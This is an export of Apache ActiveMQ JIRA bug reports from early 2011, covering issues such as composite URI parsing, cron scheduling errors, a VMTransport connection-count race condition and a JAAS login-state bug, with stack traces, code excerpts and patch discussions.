URISupport.createURIWithQuery() fails on some composite uris.,AMQ-3209,12500701,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,tabish,psiolent,psiolent,07/Mar/11 23:39,09/Mar/11 15:18,14/Jul/23 05:43,09/Mar/11 15:18,5.5.0,,,,,5.5.0,,,,,,,0,util,,,,,,,,"URISupport.createURIWithQuery() fails on composite URIs that have an inner query but not an outer query, e.g.:

outerscheme:(innerscheme:innerssp?innerquery=0)

The failure is due to the method not taking into account this possibility and assuming the query consists of everything  after the last question mark.  The attached patch adds a test case in org.apache.activemq.util.URISupportTest that demonstrates the problem, and also modifies URISupport.createURIWithQuery() with a suggested fix for the problem.",,psiolent,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"09/Mar/11 15:06;psiolent;URISupport.patch;https://issues.apache.org/jira/secure/attachment/12473138/URISupport.patch","08/Mar/11 15:50;psiolent;URISupport.patch;https://issues.apache.org/jira/secure/attachment/12472970/URISupport.patch",,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14662,,,Wed Mar 09 15:18:30 UTC 2011,,,,,,,Patch Available,,,,"0|i0ajqv:",59472,,,,,,,,,,,,,,,,,,,,,"09/Mar/11 00:08;tabish;Looking at your patch I think it probably would suffice to check if the ""?"" lies beyond the last parenthesis instead of searching for the matching set, what do you think?

Also the assert statements in the unit tests have the arguments backwards, the expected result should be first, otherwise the error message is a bit confusing.  ;;;","09/Mar/11 15:06;psiolent;Timothy, yes, you are right I think.  We should only have to check for the last parenthesis.  I was worried about getting confused on an orphan closing parenthesis, but in reality that would seem to indicate a malformed URI, and so in that case we shouldn't have to guarantee any particular behavior.

I've created a new patch that only checks for closing parenthesis and also fixes the backwards assert statements in the unit tests.  I'm going to upload this new patch over the previous one.;;;","09/Mar/11 15:18;tabish;Patch applied, thanks.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Unsubscribed durable sub can leave dangling message reference in kahaDB, visible after a restart",AMQ-3206,12500639,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,07/Mar/11 14:55,23/Apr/12 10:10,14/Jul/23 05:43,07/Mar/11 14:59,5.4.2,,,,,5.5.0,,,Message Store,,,,0,durable,kahaDB,topic,,,,,,"Unsubscribing a durable sub with kahaDB cleans up the expected ack locations but does not update the change to the persistent index. After a restart, the old state is recovered which can lead to invalid references to messages. These references can block journal file deletion when the message is ultimately consumed by all interested subs, Leading to data file build up. The necessary conditions are multiple durable subs with some unsubscribing with a remaining backlog along with broker restarts. ",,buchi,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14659,,,Mon Apr 23 10:10:58 UTC 2012,,,,,,,,,,,"0|i0agw7:",59010,,,,,,,,,,,,,,,,,,,,,"07/Mar/11 14:59;gtully;fix in http://svn.apache.org/viewvc?rev=1078799&view=rev;;;","23/Apr/12 10:10;buchi;I think this is still happening. Please see https://issues.apache.org/jira/browse/AMQ-3802;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Sending an Empty MapMessage over HttpTransport fails with exception,AMQ-3202,12500519,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,tabish,tabish,tabish,05/Mar/11 17:12,04/May/11 18:56,14/Jul/23 05:43,05/Mar/11 17:16,5.4.2,,,,,5.5.0,,,Transport,,,,0,,,,,,,,,When sending a MapMessage with no body to a client that's connected via HTTP an exception is thrown when the message is unmarshaled from XML and the copy method is invoked.  ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-3026,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14652,,,Wed May 04 18:56:30 UTC 2011,,,,,,,,,,,"0|i0ajrz:",59477,,,,,,,,,,,,,,,,,,,,,"05/Mar/11 17:14;tabish;The ActiveMQMapMessage command needs to implement the serialization method readResolve in order to ensure that the transient Map object is created on when the object is de-serialized from the XML stream.;;;","05/Mar/11 17:16;tabish;Fixed in trunk;;;","04/May/11 18:46;artnaseef;Would you provide the revision number for this fix?;;;","04/May/11 18:53;artnaseef;Looks like:
  FIX:  http://svn.apache.org/viewvc?rev=1078312&view=rev
  TEST: http://svn.apache.org/viewvc?rev=1078311&view=rev

Is that right?
;;;","04/May/11 18:56;tabish;Yes, you can see that by looking at the subversion commits tab for this issue.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Scheduled CRON jobs execute twice,AMQ-3200,12500497,,Bug,Closed,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,aletheia7,aletheia7,05/Mar/11 05:38,13/Apr/13 06:11,14/Jul/23 05:43,14/Mar/11 19:46,5.5.0,,,,,5.5.0,,,Broker,,,,0,,,,,,,,,"A Cron Entry of ""50 20 * * 5"" executes at the 20:50 time and then a second time 60 seconds later. It executes twice.",Windows Server 2003 with Java 1.6.0_22,aletheia7,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-3199,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14672,,,Sat Apr 13 06:11:21 UTC 2013,,,,,,,,,,,"0|i0ajs7:",59478,,,,,,,,,,,,,,,,,,,,,"10/Mar/11 23:39;tabish;Issues in the scheduler that cause 3199 also cause this problem.;;;","14/Mar/11 19:46;tabish;fixed in trunk.;;;","13/Apr/13 06:11;aletheia7;Fixed;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
CRON next scheduled time incorrectly calculated,AMQ-3199,12500496,,Bug,Closed,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,aletheia7,aletheia7,05/Mar/11 05:29,13/Apr/13 06:11,14/Jul/23 05:43,14/Mar/11 19:46,5.5.0,,,,,5.5.0,,,Broker,,,,0,,,,,,,,,"A Cron Entry of ""50 20 * * 5"" with an AMQ_SCHEDULED_DELAY of 61000 (61 seconds) started at 2011-03-04 20:48:24. The last ""5"" in the Cron Entry specifies only Fridays and 2011-03-04 is a Friday. The cron job ran and set ""next scheduled time"" to be 2011-03-10 20:50:25. 2011-03-11 is a Thursday. The correct ""next scheduled time"" should be 2011-03-11 20:50:25; it should be Friday.

In addition, the reason why I set the delay to 61000 was because with the default delay of 0, the job executes twice with a 60 second interval. I will file a separate issue.

I believe the Cron Entry has a problem with using asterisks. I tried a Cron Entry of ""27 19 1-31 1-12 6"" which is a Saturday. It ran at 19:27 and then correctly set the ""next scheduled time"" to be on the next Saturday. This is a temporary workaround.",Windows Server 2003 with java 1.6.0_22,aletheia7,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-3200,,,,,,,,,,,,,"08/Mar/11 20:41;aletheia7;activemq-admin-query.txt;https://issues.apache.org/jira/secure/attachment/12473042/activemq-admin-query.txt","08/Mar/11 20:25;aletheia7;s1.png;https://issues.apache.org/jira/secure/attachment/12473039/s1.png","08/Mar/11 20:26;aletheia7;s2.jpg;https://issues.apache.org/jira/secure/attachment/12473040/s2.jpg",,,,,,,,,,,,,,,,,,,3.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14653,,,Sat Apr 13 06:11:04 UTC 2013,,,,,,,,,,,"0|i0ajsf:",59479,,,,,,,,,,,,,,,,,,,,,"07/Mar/11 15:55;tabish;Added new test case for this cron entry in trunk, the next scheduled time was calculated correctly.;;;","08/Mar/11 20:18;aletheia7;I downloaded the latest 5.5 snapshot and repeated the issue. The issue still exists. I have attached two screen shots to show the problem.

s1.png shows the initial Cron Entry set to run Tuesday 3/8/2011 @ 12:11:35pm. s2.png shows the Cron Entry after the message was delivered. The next scheduled time is incorrectly set for 3/14/2011 @ 12:10:35pm which is Monday. It should be set for 3/15/2011 @ 12:10:35pm; i.e. Tuesday.

The activemq version I downloaded was apache-activemq-5.5-SNAPSHOT-bin-2011-03-06-03-55-16.zip.;;;","08/Mar/11 20:41;aletheia7;This file contains the output from the command ""activemq-admin query"" after the s2.png screen shot.;;;","08/Mar/11 23:46;tabish;Ok, now I see what you are running into.  Missed in the description that it was the second time around that was causing the issue, think the extra 60 second discussion confused me.  I can fix the problem with the day being wrong but having look more closely at the code I see where it can go wrong with other crontab entries.  ;;;","14/Mar/11 19:46;tabish;This should now be fixed in trunk, cron strings should now act like you'd expect.  If you find any issues please report the misbehaving cron strings.;;;","13/Apr/13 06:11;aletheia7;Fixed;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Consumers won't get msgs after JMX operation removeMatchingMessages() was called on a queue.,AMQ-3193,12499922,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,dejanb,dejanb,28/Feb/11 13:49,28/Feb/11 14:35,14/Jul/23 05:43,28/Feb/11 14:35,5.4.2,,,,,5.5.0,,,,,,,0,,,,,,,,,"Follow these steps to reproduce the problem:
* start broker
* start a producer and send two or more messages to a queue
* start jconsole
* click on the queue and select Operations.
* click browse and copy the JMSMessageID of the first message into clipboard
* invoke JMX operation removeMatchingMessages() with argument JMSMessageID='<message id>' , where <message id> is the copied JMSMessageID.
* verify that >= 1 message are still on the queue
* now start a consumer that connects to this queue. It won't get any messages.
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14647,,,Mon Feb 28 14:35:18 UTC 2011,,,,,,,,,,,"0|i0ajtj:",59484,,,,,,,,,,,,,,,,,,,,,"28/Feb/11 14:35;dejanb;Fixed with svn revision 1075346;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Durable Subscription - missing messages when selector matching sub resumes after broker restart,AMQ-3190,12499704,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,25/Feb/11 12:45,25/Feb/11 13:18,14/Jul/23 05:43,25/Feb/11 13:18,5.4.2,,,,,5.5.0,,,Message Store,,,,0,durable,kahadb,topic,,,,,,"Durable subs, online offline with a mix of filter matching and unmatched.

Scenario, one offline durable sub with selector, lots of messages that don't match, second durable sub with selector. Broker restart. After restart, publish matching messages. New messages get wrong order id within the broker, such that ids are reused and second sub misses messages. 
 ",,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14697,,,Fri Feb 25 13:18:23 UTC 2011,,,,,,,,,,,"0|i0ajtz:",59486,,,,,,,,,,,,,,,,,,,,,"25/Feb/11 13:18;gtully;fix in http://svn.apache.org/viewvc?rev=1074511&view=rev;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
IllegalMonitorStateException in default topic consumer of maven-activemq-perf-plugin,AMQ-3187,12499360,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,tmielke,tmielke,22/Feb/11 16:13,24/Feb/11 20:12,14/Jul/23 05:43,24/Feb/11 20:12,5.4.2,,,,,5.5.0,,,Performance Test,,,,0,mvn,perfomance,,,,,,,"Running 

{code}
mvn activemq-perf:consumer -Dfactory.brokerURL=tcp://localhost:61616 
-Dconsumer.destName=topic://Test -Dconsumer.sessAckMode=autoAck -Dconsumer.recvType=count 
{code}

generates
{code}
Exception in thread ""JmsConsumer0 Thread"" java.lang.IllegalMonitorStateException
        at java.lang.Object.wait(Native Method)
        at java.lang.Object.wait(Object.java:485)
        at org.apache.activemq.tool.JmsConsumerClient.receiveAsyncCountBasedMessages(JmsConsumerClient.java:176)
        at org.apache.activemq.tool.JmsConsumerClient.receiveMessages(JmsConsumerClient.java:54)
        at org.apache.activemq.tool.JmsConsumerClient.receiveMessages(JmsConsumerClient.java:67)
        at org.apache.activemq.tool.JmsConsumerClient.receiveMessages(JmsConsumerClient.java:72)
        at org.apache.activemq.tool.JmsConsumerSystem.runJmsClient(JmsConsumerSystem.java:62)
        at org.apache.activemq.tool.AbstractJmsClientSystem$1.run(AbstractJmsClientSystem.java:85)
        at java.lang.Thread.run(Thread.java:619)
{code}

Using -Dconsumer.asyncRecv=false resolves the problem.
",maven-activemq-perf-plugin ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"22/Feb/11 16:44;tmielke;AMQ-3187.patch;https://issues.apache.org/jira/secure/attachment/12471633/AMQ-3187.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14693,,,Thu Feb 24 20:12:34 UTC 2011,,,,,,,,,,,"0|i0ajuf:",59488,,,,,,,,,,,,,,,,,,,,,"22/Feb/11 16:44;tmielke;Attaching proposed patch to resolve this exception. ;;;","24/Feb/11 20:12;tabish;patch applied, thanks.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Closing a VMTransport can cause all other VMTransports to be prematurely closed,AMQ-3185,12499175,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Critical,Fixed,tabish,stirlingc,stirlingc,20/Feb/11 19:14,24/Feb/11 16:52,14/Jul/23 05:43,24/Feb/11 16:52,5.4.2,,,,,5.5.0,,,Transport,,,,0,,,,,,,,,"Symptom
=======
We have eight servers running AMQ 5.3.1 connected in a network-of-brokers over HTTP.  Each broker maintains local connections to internal consumers using the VM transport.  We were noticing that about once every day, all the local VM connections on a broker and the outbound network bridge connections would fail with the following error:

2010-12-10 04:29:11,663 [processBroker-process-pool-thread-4] ERROR - The worker encountered an exception and will pause for 5 seconds before continuing.
javax.jms.JMSException: Peer (vm://broker-mbus-200005#1052452) disposed.
	at org.apache.activemq.util.JMSExceptionSupport.create(JMSExceptionSupport.java:62)
	at org.apache.activemq.ActiveMQMessageConsumer.dequeue(ActiveMQMessageConsumer.java:453)
	at org.apache.activemq.ActiveMQMessageConsumer.receive(ActiveMQMessageConsumer.java:570)
	at com.invoqsystems.foundation.component.communication.jms.source.JMSMessageSource.getMessage(JMSMessageSource.java:33)
	at com.invoqsystems.foundation.component.communication.jms.source.JMSMessageSource.getMessage(JMSMessageSource.java:95)
	at com.invoqsystems.foundation.component.communication.jms.worker.MessageProcessingWorker.getTask(MessageProcessingWorker.java:9)
	at com.invoqsystems.foundation.component.communication.jms.worker.AbstractWorker.iterate(AbstractWorker.java:14)
	at com.invoqsystems.foundation.component.communication.jms.worker.AbstractWorker.runUntilStop(AbstractWorker.java:17)
	at com.invoqsystems.foundation.component.communication.jms.worker.AbstractWorker.run(AbstractWorker.java:41)
	at java.lang.Thread.run(Unknown Source)
Caused by: org.apache.activemq.transport.TransportDisposedIOException: Peer (vm://broker-mbus-200005#1052452) disposed.
	at org.apache.activemq.transport.vm.VMTransport.stop(VMTransport.java:70)
	at org.apache.activemq.transport.TransportFilter.stop(TransportFilter.java:64)
	at org.apache.activemq.transport.TransportFilter.stop(TransportFilter.java:64)
	at org.apache.activemq.transport.ResponseCorrelator.stop(ResponseCorrelator.java:132)
	at org.apache.activemq.broker.TransportConnection.doStop(TransportConnection.java:956)
	at org.apache.activemq.broker.TransportConnection$3.run(TransportConnection.java:918)
	at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(Unknown Source)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(Unknown Source)
	... 1 more

This was quite unexpected since we create the VM transport connection at broker startup and maintain it (the single connection) throughout the life of the application.  The connection is only closed when the process terminates and the broker is stopped.

Since we wrote our consumers against the JMS spec, we handle periodic connection failures by creating a new connection.  This works fine sometimes; however, because of AMQ-3127, the sudden reregistration of our consumers simultaneously occurring with bridge re-creation causes frequent deadlock that can only be resolved by restarting the systems.

Cause
=====
We were unable to reliably recreate the failure, so it became clear that a timing issue was involved.  Eventually, we determined the cause of the VM transport failure was due to the following code in VMTransportServer:

{code:title=VMTransportServer.java}
    public VMTransport connect() throws IOException {
        TransportAcceptListener al;
        synchronized (this) {
            if (disposed) {
                throw new IOException(""Server has been disposed."");
            }
            al = acceptListener;
        }
        if (al == null) {
            throw new IOException(""Server TransportAcceptListener is null."");
        }

        connectionCount.incrementAndGet();
        VMTransport client = new VMTransport(location) {
            public void stop() throws Exception {
                if (disposed) {
                    return;
                }
                super.stop();
                if (connectionCount.decrementAndGet() == 0 && disposeOnDisconnect) {
                    VMTransportServer.this.stop();
                }
            };
        };

        VMTransport server = new VMTransport(location);
        client.setPeer(server);
        server.setPeer(client);
        al.onAccept(configure(server));
        return client;
    }
{code}

At issue is the override VMTransport.stop() method:

{code:title=VMTransportServer.java}
            public void stop() throws Exception {
                if (disposed) {
                    return;
                }
                super.stop();
                if (connectionCount.decrementAndGet() == 0 && disposeOnDisconnect) {
                    VMTransportServer.this.stop();
                }
            };
{code}

Note that VMTransport.disposed is used to protect against multiple calls and subsequently multiple decrements of connectionCount.  However, in the implementation of super.stop(), the disposed flag is only set after the peer transport is informed of the stop:

{code:title=VMTransport.java}
    public void stop() throws Exception {
        stopping.set(true);
        
        // If stop() is called while being start()ed.. then we can't stop until we return to the start() method.
        if( enqueueValve.isOn() ) {
        	
            // let the peer know that we are disconnecting..
            try {
>>>                peer.transportListener.onCommand(new ShutdownInfo());
            } catch (Exception ignore) {
            }
        	
        	
            TaskRunner tr = null;
            try {
                enqueueValve.turnOff();
                if (!disposed) {
                    started = false;
>>>                    disposed = true;
                    if (taskRunner != null) {
                        tr = taskRunner;
                        taskRunner = null;
                    }
                }
            } finally {
                stopping.set(false);
                enqueueValve.turnOn();
            }
            if (tr != null) {
                tr.shutdown(1000);
            }
            

        }
        
    }
{code}

TransportConnection implements of peer.transportListener.onCommand(new ShutdownInfo()) by launching a asynchronous task that eventually calls back to the same transport that initiated the closure.  If the timing is right, VMTransportServer's VMTransport.stop() method is called a second time before the disposed flag is set to true.  As a result, the connectionCount is decremented *TWICE* instead of just once.

In other words, the diposed check and decrement as implemented by VMTransport's anonymous VMTransport subclass are not thread-safe.  If VMTransportServer miscounts the connections, it can end up stopping itself while there are still live connections.  The result is that the live connections see their peer (the server part of the VMTransport) unexpectedly closed.

Solution
========
The attached patch prevents multiple decrements of the connectionCount by preventing reentrant calls to VMTransportServer's VMTransport stop() method.

A patch is included which demonstrates the problem with the existing AMQ trunk code.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-3127,,,,,,,,,,,,,"20/Feb/11 19:17;stirlingc;VMTransportClosureTest.java;https://issues.apache.org/jira/secure/attachment/12471530/VMTransportClosureTest.java","20/Feb/11 19:15;stirlingc;patch.diff;https://issues.apache.org/jira/secure/attachment/12471527/patch.diff",,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14695,,,Thu Feb 24 16:52:52 UTC 2011,,,,,,,Patch Available,,,,"0|i0ajuv:",59490,,,,,,,,,,,,,,,,,,,,,"20/Feb/11 19:15;stirlingc;Patch that prevents VMTransportServer/VMTransport from mistakenly decrementing connectionCount more than once per VMTransport.;;;","20/Feb/11 19:17;stirlingc;Unit test that demonstrates the premature closure of VMTransport.  The test is timing dependent, but on our systems it fails nearly always within 10 iterations of the loop.

After the patch is applied, the test passes 100% of the time.;;;","20/Feb/11 19:22;stirlingc;It should be noted that we originally encountered this error on AMQ 5.3.1.  While the bug was in VMTransport/VMTransportServer, it was exposed by the existence of broker-to-broker bridges that frequently failed (i.e., in our network of brokers, several brokers are for failover and are not started during normal operations).  A number of changes in AMQ 5.4.2, specifically the modification of VMTransport's stop() method to send a ShutdownInfo to the peer rather than triggering its exception handler, prevented the bug from appearing in our runtime environments.  However, further analysis of the AMQ trunk source revealed that the root cause, even though no longer triggered in our runtime environment, was still present --- specifically the ability of VMTransportServer to mistakenly decrement connectionCount multiple times.

Given the reported deadlock with bridge creation, this turned out to be a significant issue with the stability of our system.  We would like the root cause addressed to prevent possible reintroduction in subsequent versions.;;;","20/Feb/11 19:23;stirlingc;When combined with AMQ-3127, AMQ-3185 created a major problem with the stability of our systems.;;;","24/Feb/11 16:52;tabish;Applied patch, thanks for the great test case.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"JAAS PropertiesLoginModule does not maintain internal validity state, so will commit in error after an invalid login attempt",AMQ-3182,12498775,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,16/Feb/11 15:50,16/Feb/11 16:33,14/Jul/23 05:43,16/Feb/11 16:33,5.4.2,,,,,5.5.0,,,Broker,,,,0,Authentication,JAAS,security,,,,,,"Issue visible when using the JaasDualAuthenticationPlugin which uses two login modules. An failed login attempt as system (with wrong password) will still succeed with the guest module, but the principals should be restricted to the guest role. They are not as the failed system module still commits in error.",,mpaladin,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14681,,,Wed Feb 16 16:33:42 UTC 2011,,,,,,,,,,,"0|i0ajvj:",59493,,,,,,,,,,,,,,,,,,,,,"16/Feb/11 16:33;gtully;fix in http://svn.apache.org/viewvc?rev=1071301&view=rev;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
ActiveMQConnectionFactory fails in an Applet enviroment,AMQ-3181,12498633,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,chirino,chirino,chirino,15/Feb/11 13:00,15/Feb/11 13:03,14/Jul/23 05:43,15/Feb/11 13:03,5.4.2,,,,,5.5.0,,,JMS client,,,,0,,,,,,,,,Initial error report can be found here: http://stackoverflow.com/questions/4997117/applet-not-getting-initialized-on-the-browser-while-using-jms-to-connect-to-activ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14680,,,Tue Feb 15 13:03:21 UTC 2011,,,,,,,,,,,"0|i0ajvr:",59494,,,,,,,,,,,,,,,,,,,,,"15/Feb/11 13:02;chirino;Looks like ActiveMQ is trying to register a PropertyEditor which is not allowed by the applet security sandbox.  Every thing should work fine even if the property editor does not get registered so it's  a simple case of just having to trap the exception.;;;","15/Feb/11 13:03;chirino;fixed in revision 1070876;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"JMX Browse of BytesMessage fails with javax.management.openmbean.OpenDataException: Argument's element itemValues[8]=""[B@de15a0"" is not a valid value for this item",AMQ-3180,12498515,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,gtully,gtully,gtully,14/Feb/11 11:02,14/Feb/11 11:22,14/Jul/23 05:43,14/Feb/11 11:22,5.3.0,5.4.0,,,,5.5.0,,,JMX,,,,0,BytesMessage,jmx,,,,,,,"delivery of messages is not effected, but a browse returns no results via jmx and exceptions appear on the broker, eg:
{code}2011-01-24 05:20:05,672 [)-209.114.68.32] WARN DestinationViewMBean - exception browsing destination javax.management.openmbean.OpenDataException: Argument's element itemValues[15]=""[B@8e3f75"" is not a valid value for this item (itemName=BodyPreview,itemType=javax.management.openmbean.ArrayType(name=[Ljava.lang.Byte;,dimension=1,elementType=javax.management.openmbean.SimpleType(name=java.lang.Byte))).
atjavax.management.openmbean.CompositeDataSupport.<init>(CompositeDataSupport.java:145)
atjavax.management.openmbean.CompositeDataSupport.<init>(CompositeDataSupport.java:190)
At org.apache.activemq.broker.jmx.OpenTypeSupport.convert (OpenTypeSupport.java:398)
At org.apache.activemq.broker.jmx.DestinationView.browseMessages (DestinationView.java:195)
